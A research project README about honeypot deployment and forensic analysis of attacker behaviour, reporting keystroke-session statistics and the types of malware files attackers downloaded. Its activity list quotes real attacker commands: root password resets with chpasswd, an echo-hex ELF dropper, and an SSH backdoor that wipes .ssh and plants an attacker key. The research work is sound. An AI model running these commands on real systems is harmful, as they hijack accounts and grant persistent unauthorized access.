# Project: HoneyNet and DFIR

## Project Overview
This project involves the deployment of honeypots to collect malware files and monitor hacker activities. The data gathered from these honeypots are analyzed in the Digital Forensic Lab within the Digital Forensics and Incident Response (DFIR) framework. Additionally, hacking patterns identified in the Penetration Testing lab are studied in the Digital Forensic Lab.

## Findings and Studies

### T-Pot Honeypot Deployment

We have deployed the T-Pot honeypot on a cloud platform to collect malware files and monitor hacker activities. The following screenshot provides an overview of the top 10 attacks, attack map, attackers' OS distribution, attackers by country, username and password tag cloud, attackers' autonomous systems (AS) and source IPs, detected Common Vulnerabilities and Exposures (CVEs), and Suricata IDS alerts over the past 4 weeks.

<div align="left">
    <img src="./screenshot/T-pot.jpg" alt="TPot" width="1000">
</div>

### T-Pot Honeypot Usage

Watch the video below to learn how to use the T-Pot honeypot to collect malware files and monitor hacker activities.
[![Watch the video](https://img.youtube.com/vi/918dgVJLqgU/0.jpg)(https://www.youtube.com/watch?v=918dgVJLqgU)

### Hacker Activities and Keystroke Analysis

A total of 6,420 hacker keystroke sessions have been recorded following their break-ins, encompassing 133,694 lines of keystrokes. The common activities performed by hackers after breaking into systems include:

- **Probing Victim Host Information:** Gathering details such as IP address, OS version, installed software, CPU, memory, and disk size.
- **Enabling All Services:** Activating all services on the victim host.
- **Modifying Credentials:** Changing the root password or creating other root accounts. E.G.
    - echo "root:ZYOYI3d9rSGq"|chpasswd|bash
    - echo -e "new_password\nnew_password"|passwd|bash
- **Downloading Files:** Using tools like `wget`, `ftp`, or `curl` to download files and attempting to execute them.
- **Creating Binary Files:** Using echo hex code to create binary files and attempting to execute them. E.G.
    - echo -ne "\x7f\x45\x4c\x46\x01\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x08\x00\x00\x00\x01\x00\x40\x00\xb0\x00\x00\x00\x34\x00\x00\x01\x64\x00\x00\x10\x06\x00\x34\x00\x20\x00\x02\x00\x28\x00\x03\x00\x02\x70\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" >> .s
- **Installing Trojan Programs:** Installing trojan horse programs.
- **Establishing Backdoors:** Appending public keys to the `authorized_keys` file for SSH access. E.G.
    - cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa
AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~echo "123456\nO9O7RwyNaHwh\nO9O7RwyNaHwh\n"|passwd echo "root:8ufW8KmuglZC"|chpasswd|bash
- **Setting Up Proxy Servers:** Configuring IRC proxies, botnet command and control channels.
- **Running DDoS Attacks:** Conducting Distributed Denial of Service (DDoS) attacks.
- **Mining Cryptocurrency:** Running cryptocurrency mining operations.

### Downloaded Files Analysis

We have archived 210 unique files downloaded by hackers. Below is the distribution of these file types:

| File Type                 | Percentage |
|---------------------------|------------|
| Executable Binary         | 46%        |
| ASCII Text                | 22%        |
| Data                      | 17%        |
| Shell Script              | 7%         |
| Gzip Compressed Data      | 7%         |
| OpenSSH RSA Public Key    | 1%         |

Most of these files, except for some recent downloads or short shell scripts, can be identified by various antivirus agents on VirusTotal. These files are primarily classified as Trojan horses, DDoS tools, and CoinMiners.

Below screenshot shows the Virustotal hash search of a download file 
<div align="left">
    <img src="./screenshot/virustotal.jpg" alt="VirusTotal" width="1000">
</div>


You can view the hash and file type of these downloaded files at [here](./data/dl_file_hash.txt).


## Future Work

- **Enhance Digital Forensic Lab:** Improve the lab's capabilities for both static and dynamic analysis of collected malware.
- **Develop Analytical Tools:** Create tools to analyze the correlation between the time gap of malware collection and vulnerability release, focusing on the frequency of zero-day attacks.
- **Expand Honeypot Deployment:** Deploy more honeypots in different regions and compare the collected data to identify regional variations in hacker activities.

